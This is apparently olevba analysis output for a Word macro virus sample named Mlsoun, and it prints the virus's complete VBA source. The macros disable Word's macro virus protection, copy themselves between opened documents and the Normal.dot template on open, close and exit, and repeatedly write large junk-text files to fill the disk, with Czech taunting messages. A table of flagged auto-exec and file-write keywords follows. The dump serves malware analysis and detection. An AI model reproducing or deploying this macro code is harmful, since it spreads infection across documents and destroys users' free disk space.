olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mlsoun
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mlsoun - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mlsoun1.bas 
in file: Virus.MSWord.Mlsoun - OLE stream: 'Macros/VBA/Mlsoun1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoexec()
'jsem&ml$oun2
'for template
Dim pocitadlo As Integer
On Error GoTo errs
    Options.VirusProtection = False
    ChDir (Application.Path)
    filecount = CurDir + "\count.dll"
    Open filecount For Binary As #1
    Get #1, 1, pocitadlo
    pocitadlo = pocitadlo + 1
    Put #1, 1, pocitadlo
    Close #1
    soubor = Application.Path & "\" & "off" & pocitadlo & ".dll"
    Open soubor For Output As #2
    retezec = "Jsem Mlsoun1, a mam rad Vas harddisk, radeji si poridte velmi maly, at mne lepe najdete!"
    Do While Not delk = 30000
        Print #2, retezec
        delk = delk + 1
    Loop
    Close #2
Exit Sub
errs:
    Select Case Err.Number
        Case 61
            c = MsgBox("Nedostatek mista na disku!Toto zpusobil virus MLSOUN!", vbExclamation)
        Case Else
    End Select
End Sub
Sub AutoClose()
'from template to file
On Error GoTo errs
    docu = Application.ActiveDocument.Name
    If dok = "Normal.dot" Then Exit Sub
    docupath = Application.ActiveDocument.Path + "\" + docu
    templname = Application.NormalTemplate.Name
    templpath = Application.NormalTemplate.Path + "\" + templname
    Application.OrganizerCopy Source:= _
    templpath, Destination:= _
    docupath, Name:="Mlsoun1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:= _
    templpath, Destination:= _
    docupath, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
errs:
    Select Case Err.Number
        Case 5940
        Case 4248
        Case 4198
        Case 4149
        Case 0
        Case Else
    End Select
End Sub
Sub AutoExit()
'from template to file
On Error GoTo errs
    'Application.ActiveDocument.Save
    docu = Application.ActiveDocument.Name
    If dok = "Normal.dot" Then Exit Sub
    docupath = Application.ActiveDocument.Path + "\" + docu
    templname = Application.NormalTemplate.Name
    templpath = Application.NormalTemplate.Path + "\" + templname
    Application.OrganizerCopy Source:= _
    templpath, Destination:= _
    docupath, Name:="Mlsoun1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:= _
    templpath, Destination:= _
    docupath, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
errs:
    Select Case Err.Number
        Case 5940
        Case 4248
        Case 4198
        Case 4149
        Case 0
        Case Else
    End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Mlsoun - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
'jsem&ml$oun2
'from file to template
On Error GoTo errs
    Options.VirusProtection = False
    docu = Application.ActiveDocument.Name
    docupath = Application.ActiveDocument.Path + "\" + docu
    ChDir (Application.NormalTemplate.Path)
    activedir = CurDir + "\Normal.dot"
    Application.OrganizerCopy Source:= _
    docupath, Destination:= _
    activedir, Name:="Mlsoun1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:= _
    docupath, Destination:= _
    activedir, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
    Exit Sub
errs:
    Select Case Err.Number
        Case 5940   'polozku projektu nelze zkopirovat
        Case 61
            c = MsgBox("Na disku není dostatek místa. Uvolnìte místo smazáním nìkolika souborù!", vbExclamation + vbOKOnly)
        Application.ActiveWindow.Close (False)
        Case Else
    End Select
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |count.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

